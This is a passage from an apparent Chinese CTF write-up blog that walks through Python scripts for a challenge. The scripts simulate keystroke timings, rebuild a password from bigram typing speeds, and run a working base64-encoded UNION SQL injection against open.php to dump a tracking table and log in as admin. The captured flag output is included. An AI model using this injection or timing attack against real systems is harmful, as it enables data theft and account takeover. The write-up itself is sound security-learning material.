title="30行返回next_char_map中键的随机项。"></a><code>30</code>行返回<code>next_char_map</code>中键的随机项。</h6><h6 id="32行获取password的最后一个字母。"><a href="#32行获取password的最后一个字母。" class="headerlink" title="32行获取password的最后一个字母。"></a><code>32</code>行获取password的最后一个字母。</h6><h6 id="34-37行判断last-char是否在next-char-map中不是就按照上面的步骤。"><a href="#34-37行判断last-char是否在next-char-map中不是就按照上面的步骤。" class="headerlink" title="34~37行判断last_char是否在next_char_map中不是就按照上面的步骤。"></a><code>34~37</code>行判断<code>last_char</code>是否在next_char_map中不是就按照上面的步骤。</h6><h6 id="38行生成下一个字符。"><a href="#38行生成下一个字符。" class="headerlink" title="38行生成下一个字符。"></a><code>38</code>行生成下一个字符。</h6><h6 id="39行删除last-char数组对象。"><a href="#39行删除last-char数组对象。" class="headerlink" title="39行删除last_char数组对象。"></a><code>39</code>行删除<code>last_char</code>数组对象。</h6><h6 id="40行合并password字符串。"><a href="#40行合并password字符串。" class="headerlink" title="40行合并password字符串。"></a><code>40</code>行合并password字符串。</h6><h6 id="42行返回一个字符串。"><a href="#42行返回一个字符串。" class="headerlink" title="42行返回一个字符串。"></a><code>42</code>行返回一个字符串。</h6><h6 id="其余没有必要再分析了。"><a href="#其余没有必要再分析了。" class="headerlink" title="其余没有必要再分析了。"></a>其余没有必要再分析了。</h6><ul>
+<li><code>generate_behaviour.py</code>的内容如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> bcrypt <span class="keyword">import</span> hashpw, gensalt</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'Please pip install bcrypt'</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> generate_password <span class="keyword">import</span> generate_password_from_file</span><br><span class="line"></span><br><span class="line"><span class="comment"># Time range in milli seconds</span></span><br><span class="line">RANGE_SLOW = [<span class="number">400</span>, <span class="number">500</span>]</span><br><span class="line">RANGE_FAST = [<span class="number">100</span>, <span class="number">200</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Splits the password into bigrams</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">learn_password</span><span class="params">(password)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [char_a + char_b <span class="keyword">for</span> char_a, char_b <span class="keyword">in</span> zip(password[:<span class="number">-1</span>], password[<span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">range_normal_variate</span><span class="params">(start, end)</span>:</span></span><br><span class="line">    mid = (start + end) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> round(random.normalvariate(mid, mid * <span class="number">0.1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">annotate_text</span><span class="params">(learned, text)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(text) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># normalize</span></span><br><span class="line">    text = text.replace(<span class="string">'\n'</span>, <span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># start at t=0</span></span><br><span class="line">    annotated = []</span><br><span class="line">    time_offset = <span class="number">0</span></span><br><span class="line">    annotated.append((text[<span class="number">0</span>], time_offset))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> prev_char, curr_char <span class="keyword">in</span> zip(text[:<span class="number">-1</span>], text[<span class="number">1</span>:]):</span><br><span class="line">        bigram = prev_char + curr_char</span><br><span class="line">        <span class="keyword">if</span> bigram <span class="keyword">in</span> learned:</span><br><span class="line">            start, end = RANGE_FAST</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start, end = RANGE_SLOW</span><br><span class="line">        delta = range_normal_variate(start, end)</span><br><span class="line">        time_offset += delta</span><br><span class="line">        annotated.append((curr_char, time_offset))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> annotated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">annotate_file</span><span class="params">(password, input_file)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(input_file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read().decode(encoding=<span class="string">'utf-8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">    </span><br><span class="line">    learned = learn_password(password)</span><br><span class="line">    annotated = annotate_text(learned, content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> annotated</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(input_file, password=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> password <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        password = generate_password_from_file(input_file)</span><br><span class="line">    password_hash = hashpw(password, gensalt())</span><br><span class="line"></span><br><span class="line">    annotated = annotate_file(password, input_file)</span><br><span class="line">    <span class="comment">#print(annotated)</span></span><br><span class="line">    </span><br><span class="line">    time_start = <span class="number">1571738400000</span> <span class="comment"># 2019-10-22 10:00:00 UTC</span></span><br><span class="line">    admin_user_id = <span class="number">1</span></span><br><span class="line">    admin_path = <span class="string">"/admin.php"</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'USE `rpdg`;'</span>)</span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">'-- create the admin account'</span>)</span><br><span class="line">    print(<span class="string">'-- admin:&#123;&#125;'</span>.format(password))</span><br><span class="line">    print(<span class="string">'INSERT INTO users (`name`, `pwhash`) VALUES ("admin", "&#123;&#125;");'</span>.format(password_hash))</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'INSERT INTO tracking (`key`, `timestamp`, `user`, `path`) VALUES '</span>)</span><br><span class="line">    <span class="keyword">for</span> key, timestamp <span class="keyword">in</span> annotated:</span><br><span class="line">        print(<span class="string">'("&#123;&#125;", &#123;&#125;, &#123;&#125;, "&#123;&#125;")&#123;&#125;'</span>.format(key, timestamp + time_start, admin_user_id, admin_path, <span class="string">';'</span> <span class="keyword">if</span> timestamp == annotated[<span class="number">-1</span>][<span class="number">1</span>] <span class="keyword">else</span> <span class="string">','</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">2</span>, <span class="number">3</span>]:</span><br><span class="line">        print(<span class="string">'Usage: &#123;&#125; &lt;textfile&gt; [password]'</span>.format(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    input_file = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        password = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        password = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    main(input_file, password=password)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="3-9行导入bcrypt包用来验证口令密文。"><a href="#3-9行导入bcrypt包用来验证口令密文。" class="headerlink" title="3~9行导入bcrypt包用来验证口令密文。"></a><code>3~9</code>行导入<code>bcrypt</code>包用来验证口令密文。</h6><h6 id="11行是上面分析的内容。"><a href="#11行是上面分析的内容。" class="headerlink" title="11行是上面分析的内容。"></a><code>11</code>行是上面分析的内容。</h6><h6 id="14-15行是定义时间间隔。"><a href="#14-15行是定义时间间隔。" class="headerlink" title="14~15行是定义时间间隔。"></a><code>14~15</code>行是定义时间间隔。</h6><h6 id="19-20行上面已经分析过了。"><a href="#19-20行上面已经分析过了。" class="headerlink" title="19~20行上面已经分析过了。"></a><code>19~20</code>行上面已经分析过了。</h6><h6 id="23-25行返回一个正态随机变量。"><a href="#23-25行返回一个正态随机变量。" class="headerlink" title="23~25行返回一个正态随机变量。"></a><code>23~25</code>行返回一个正态随机变量。</h6><h6 id="33行将输入的字符串中的换行符全部替换为空格。"><a href="#33行将输入的字符串中的换行符全部替换为空格。" class="headerlink" title="33行将输入的字符串中的换行符全部替换为空格。"></a><code>33</code>行将输入的字符串中的换行符全部替换为空格。</h6><h6 id="40行遍历text两两组合成的两个字符的字符串，如-Lo-。"><a href="#40行遍历text两两组合成的两个字符的字符串，如-Lo-。" class="headerlink" title="40行遍历text两两组合成的两个字符的字符串，如(Lo)。"></a><code>40</code>行遍历text两两组合成的两个字符的字符串，如(Lo)。</h6><h6 id="其余大家感兴趣的继续分析……。"><a href="#其余大家感兴趣的继续分析……。" class="headerlink" title="其余大家感兴趣的继续分析……。"></a>其余大家感兴趣的继续分析……。</h6><ul>
+<li><code>analyze.py</code>的内容如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> generate_behaviour <span class="keyword">import</span> annotate_file, annotate_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">learn_password_bigrams</span><span class="params">(annotated)</span>:</span></span><br><span class="line">    <span class="comment"># pre-processing</span></span><br><span class="line">    bigram_speeds = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(annotated[:<span class="number">-1</span>], annotated[<span class="number">1</span>:]):</span><br><span class="line">        bigram = a[<span class="number">0</span>] + b[<span class="number">0</span>]</span><br><span class="line">        delta = b[<span class="number">1</span>] - a[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(bigram) != <span class="number">2</span>:</span><br><span class="line">            print(<span class="string">'!2: "&#123;&#125;"'</span>.format(bigram))</span><br><span class="line">            print(a)</span><br><span class="line">            print(b)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> bigram <span class="keyword">not</span> <span class="keyword">in</span> bigram_speeds:</span><br><span class="line">            bigram_speeds[bigram] = []</span><br><span class="line">        bigram_speeds[bigram].append(delta)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># calculate means of bigram speeds</span></span><br><span class="line">    bigram_means = []</span><br><span class="line">    <span class="keyword">for</span> bigram, speeds <span class="keyword">in</span> bigram_speeds.items():</span><br><span class="line">        mean = sum(speeds) / len(speeds)</span><br><span class="line">        bigram_means.append((bigram, mean))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sort by mean speeds</span></span><br><span class="line">    bigram_means_sorted = sorted(bigram_means, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># split at the biggest gap</span></span><br><span class="line">    max_gap = <span class="number">0</span></span><br><span class="line">    max_gap_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, (a, b) <span class="keyword">in</span> enumerate(zip(bigram_means_sorted[:<span class="number">-1</span>], bigram_means_sorted[<span class="number">1</span>:])):</span><br><span class="line">        gap = b[<span class="number">1</span>] - a[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> gap &gt; max_gap:</span><br><span class="line">            max_gap = gap</span><br><span class="line">            max_gap_index = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># separate the bigrams that are in the password</span></span><br><span class="line">    bigrams_fast = bigram_means_sorted[:max_gap_index]</span><br><span class="line">    password_bigrams = [x[<span class="number">0</span>] <span class="keyword">for</span> x <span class="keyword">in</span> bigrams_fast]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> password_bigrams</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span><span class="params">(password_bigrams)</span>:</span></span><br><span class="line">    <span class="comment"># prepare bigrams</span></span><br><span class="line">    next_char_map = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> bigram <span class="keyword">in</span> password_bigrams:</span><br><span class="line">        <span class="comment">#print('"&#123;&#125;"'.format(bigram))</span></span><br><span class="line">        char_a, char_b = bigram[<span class="number">0</span>], bigram[<span class="number">1</span>]</span><br><span class="line">        next_char_map[char_a] = char_b</span><br><span class="line"></span><br><span class="line">    <span class="comment"># find the beginning (the bigram that has no matching predecessor)</span></span><br><span class="line">    start_bigram = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> bigram <span class="keyword">in</span> password_bigrams:</span><br><span class="line">        <span class="keyword">if</span> bigram[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> next_char_map.values():</span><br><span class="line">            start_bigram = bigram</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># if there is no beginning, there is something wrong</span></span><br><span class="line">    <span class="keyword">if</span> start_bigram <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        print(<span class="string">'Could not find start_bigram :/'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># reconstruct the password (put all the bigrams together like dominos)</span></span><br><span class="line">    bigrams_remaining = password_bigrams[:]</span><br><span class="line">    password = start_bigram</span><br><span class="line">    bigrams_remaining.remove(start_bigram)</span><br><span class="line">    <span class="keyword">while</span> len(bigrams_remaining) &gt; <span class="number">0</span>:</span><br><span class="line">        last_char = password[<span class="number">-1</span>]</span><br><span class="line">        next_char = next_char_map[last_char]</span><br><span class="line">        password += next_char</span><br><span class="line">        bigrams_remaining.remove(last_char + next_char)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># voila, the password!</span></span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reconstruct_password</span><span class="params">(annotated)</span>:</span></span><br><span class="line">    password_bigrams = learn_password_bigrams(annotated)</span><br><span class="line">    <span class="keyword">return</span> get_password(password_bigrams)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    annotated = annotate_file(<span class="string">'heim'</span>, <span class="string">'./data/lorem-ipsum.txt'</span>)</span><br><span class="line">    print(<span class="string">'[+] Reconstructing password...'</span>)</span><br><span class="line">    password = reconstruct_password(annotated)</span><br><span class="line">    print(<span class="string">'[+] Password: &#123;&#125;'</span>.format(password))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="20行将两个字符同时出现的概率加入到bigram-speeds中。"><a href="#20行将两个字符同时出现的概率加入到bigram-speeds中。" class="headerlink" title="20行将两个字符同时出现的概率加入到bigram_speeds中。"></a><code>20</code>行将两个字符同时出现的概率加入到<code>bigram_speeds</code>中。</h6><h6 id="24-26行计算两个字符出现的时间间隔的平均时间并添加到bigram-means。"><a href="#24-26行计算两个字符出现的时间间隔的平均时间并添加到bigram-means。" class="headerlink" title="24~26行计算两个字符出现的时间间隔的平均时间并添加到bigram_means。"></a><code>24~26</code>行计算两个字符出现的时间间隔的平均时间并添加到<code>bigram_means</code>。</h6><h6 id="29行按时间也就是速度排序。"><a href="#29行按时间也就是速度排序。" class="headerlink" title="29行按时间也就是速度排序。"></a><code>29</code>行按时间也就是速度排序。</h6><h6 id="53行又将字符两两分开。"><a href="#53行又将字符两两分开。" class="headerlink" title="53行又将字符两两分开。"></a><code>53</code>行又将字符两两分开。</h6><h6 id="上面基本分析完毕。"><a href="#上面基本分析完毕。" class="headerlink" title="上面基本分析完毕。"></a>上面基本分析完毕。</h6><ul>
+<li><code>exploit.py</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> urlsafe_b64encode</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> analyze <span class="keyword">import</span> reconstruct_password</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">'http://localhost:8000'</span></span><br><span class="line">ITEMS_PER_REQUEST = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    annotated = []</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[+] Downloading DB content'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'.'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        sqli = <span class="string">'nope") UNION SELECT 420, "lel", CONCAT("FLUX", (SELECT group_concat(col SEPARATOR ";") FROM (SELECT CONCAT(`key`, ",", `timestamp`) COLLATE utf8mb4_unicode_ci as col FROM tracking WHERE `key` NOT IN (",", ";", 0x0a) LIMIT &#123;&#125; OFFSET &#123;&#125;) as tmp), "FLUX"), 1337;-- -'</span>.format(ITEMS_PER_REQUEST, offset)</span><br><span class="line">        sqli_b64 = urlsafe_b64encode(bytes(sqli, <span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">        r = requests.get(BASE_URL + <span class="string">'/open.php?title=&#123;&#125;'</span>.format(sqli_b64), allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">302</span>:</span><br><span class="line">            print(r.status_code)</span><br><span class="line">            print(r.text)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        leak = r.headers[<span class="string">'location'</span>]</span><br><span class="line">        <span class="keyword">if</span> len(leak) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        leak = leak.split(<span class="string">"FLUX"</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> leak.split(<span class="string">';'</span>):</span><br><span class="line">            last_comma = item.rfind(<span class="string">','</span>)</span><br><span class="line">            key, timestamp = item[:last_comma], item[last_comma+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># normalize</span></span><br><span class="line">            <span class="keyword">if</span> len(key) &gt; <span class="number">1</span>:</span><br><span class="line">                key = <span class="string">'_'</span></span><br><span class="line"></span><br><span class="line">            annotated.append((key, int(timestamp)))</span><br><span class="line"></span><br><span class="line">        offset += ITEMS_PER_REQUEST</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(<span class="string">'[+] Reconstructing password...'</span>)</span><br><span class="line">    password = reconstruct_password(annotated)</span><br><span class="line">    print(<span class="string">'[+] Password: &#123;&#125;'</span>.format(password))</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'user'</span>: <span class="string">'admin'</span>,</span><br><span class="line">        <span class="string">'pass'</span>: password,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(BASE_URL + <span class="string">'/login.php'</span>, data=data, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">    flag = r.text</span><br><span class="line">    print(<span class="string">'[+] Flag: &#123;&#125;'</span>.format(flag))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        BASE_URL = sys.argv[<span class="number">1</span>]</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="最后的结果："><a href="#最后的结果：" class="headerlink" title="最后的结果："></a>最后的结果：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Downloading DB content........................</span><br><span class="line">[+] Reconstructing password...</span><br><span class="line">[+] Password: womsucingraplequ</span><br><span class="line">[+] Flag: flag&#123;GDPR_is_here_to_save_y&apos;all&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/06/从一道有趣的关于nodejs的ctf题目中学到的东西/" rel="next" title="从一道有趣的关于nodejs的ctf题目中学到的东西">
+                <i class="fa fa-chevron-left"></i> 从一道有趣的关于nodejs的ctf题目中学到的东西
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
